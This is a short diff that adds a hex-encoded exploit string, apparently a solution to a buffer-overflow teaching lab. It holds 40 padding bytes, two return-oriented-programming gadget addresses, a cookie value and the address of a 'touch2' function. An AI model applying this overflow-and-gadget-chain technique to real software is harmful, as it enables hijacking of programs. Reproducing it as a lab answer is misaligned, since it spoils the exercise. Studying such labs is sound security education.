@@ -1,0 +1,5 @@
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa /* padding */
+0f 1d 40 00 00 00 00 00 /* gadget 1 */
+22 a1 c5 3f 00 00 00 00 /* cookie */
+09 1d 40 00 00 00 00 00 /* gadget 2 */
+a4 1b 40 00 00 00 00 00 /* touch2 */
